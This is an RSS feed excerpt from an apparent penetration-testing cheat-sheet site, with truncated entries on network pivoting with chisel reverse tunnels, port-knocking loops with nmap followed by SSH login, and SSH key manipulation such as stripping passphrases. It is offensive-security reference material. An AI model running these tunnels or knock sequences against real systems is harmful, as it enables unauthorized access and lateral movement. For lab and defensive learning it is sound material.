channel.title: Ssh on TLDRBins
channel.description: Recent content in Ssh on TLDRBins

item.title: Network Traffic Pivoting
item.description: Tunneling Chisel ssh socat metasploit sliver Start a local chisel Server # In our local Linux machine ./chisel server --reverse --port 8000 Ports forwarding # In target machine ./chisel client 10.10.14.10:8000 R:8080:127.0.0.1:8080 # Mutiple ports fowarding, can be different targets in the same subnet ./chisel client 10.10.14.10:8000 R:8080:172.17.0.2:8080 R:5000:172.17.0.3:5000 Socks5 # In our local Linux machine sudo nano /etc/proxychains4.conf # Add to the end of the file socks5 127.0.0.1 1080 # In target machine .

item.title: Port Knocking
item.description: knockd config location # Find knock sequence cat /etc/knockd.conf TCP UDP # For example, sequence = 123, 456, 789 for i in 123 456 789; do nmap -Pn --host-timeout 100 --max-retries 0 -p $i 10.10.11.10 >/dev/null; done; ssh -i id_rsa <USER>@10.10.11.10 # UDP port knocking for i in 123 456 789; do sudo nmap -Pn -sU --host-timeout 100 --max-retries 0 -p $i 10.10.11.10 >/dev/null; done; ssh -i id_rsa <USER>@10.10.11.10

item.title: SSH
item.description: Check SSH version openssh-server (ubuntu) openssh-server (debian) Config Location /etc/ssh/sshd_config # Grep contents grep -Ev "^#" /etc/ssh/sshd_config | grep . Generate SSH Key ssh-keygen #Set filename, leave passphase blank ./id_rsa #After Creation chmod 600 id_rsa Check Public Key ssh-keygen -l -f id_rsa Generate no passphrase SSH key from encrypted key openssl rsa -in id_rsa_encrypted -out ./id_rsa Convert .ppk to .pem format # Install sudo apt install putty-tools # Convert to private key in pem format puttygen key.
